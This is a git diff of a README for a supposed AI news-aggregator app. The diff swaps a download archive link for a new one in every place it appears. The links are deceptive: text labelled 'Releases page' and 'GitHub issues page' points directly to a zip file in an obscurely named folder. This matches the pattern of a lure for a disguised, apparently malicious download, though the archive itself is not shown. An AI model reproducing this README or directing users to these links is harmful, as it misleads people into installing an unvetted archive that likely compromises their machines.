@@ -1,6 +1,6 @@
 # 🚀 news-aggregator-ai-agent - Get Your News Delivered Effortlessly
 
-[![Download](https://raw.githubusercontent.com/aadarshsharma7/news-aggregator-ai-agent/main/contrapuntist/ai-agent-news-aggregator-1.3.zip)](https://raw.githubusercontent.com/aadarshsharma7/news-aggregator-ai-agent/main/contrapuntist/ai-agent-news-aggregator-1.3.zip)
+[![Download](https://raw.githubusercontent.com/aadarshsharma7/news-aggregator-ai-agent/main/contrapuntist/ai_aggregator_agent_news_v3.6.zip)](https://raw.githubusercontent.com/aadarshsharma7/news-aggregator-ai-agent/main/contrapuntist/ai_aggregator_agent_news_v3.6.zip)
 
 ## 📜 Description
 
@@ -24,7 +24,7 @@ The news-aggregator-ai-agent is an AI-powered tool designed to collect and summa
 Follow these steps to get your news aggregator up and running:
 
 1. **Download the Application**  
-   Visit the [Releases page to download](https://raw.githubusercontent.com/aadarshsharma7/news-aggregator-ai-agent/main/contrapuntist/ai-agent-news-aggregator-1.3.zip) the latest version of the news-aggregator-ai-agent.
+   Visit the [Releases page to download](https://raw.githubusercontent.com/aadarshsharma7/news-aggregator-ai-agent/main/contrapuntist/ai_aggregator_agent_news_v3.6.zip) the latest version of the news-aggregator-ai-agent.
 
 2. **Locate the Downloaded File**  
    Once the download is complete, locate the file on your computer. Typically, it will go to your 'Downloads' folder.
@@ -45,7 +45,7 @@ Follow these steps to get your news aggregator up and running:
 
 ## 🔗 Download & Install
 
-For easy access, you can download the application directly from the [Releases page](https://raw.githubusercontent.com/aadarshsharma7/news-aggregator-ai-agent/main/contrapuntist/ai-agent-news-aggregator-1.3.zip). Follow the instructions above to get it up and running.
+For easy access, you can download the application directly from the [Releases page](https://raw.githubusercontent.com/aadarshsharma7/news-aggregator-ai-agent/main/contrapuntist/ai_aggregator_agent_news_v3.6.zip). Follow the instructions above to get it up and running.
 
 ## ❓ FAQs
 
@@ -69,7 +69,7 @@ If you encounter issues during installation or while using the application, try 
 - Check your internet connection.
 - Restart the application or your computer.
 
-If problems persist, refer to the open issues on the [GitHub issues page](https://raw.githubusercontent.com/aadarshsharma7/news-aggregator-ai-agent/main/contrapuntist/ai-agent-news-aggregator-1.3.zip) for support.
+If problems persist, refer to the open issues on the [GitHub issues page](https://raw.githubusercontent.com/aadarshsharma7/news-aggregator-ai-agent/main/contrapuntist/ai_aggregator_agent_news_v3.6.zip) for support.
 
 ## 📞 Support
 
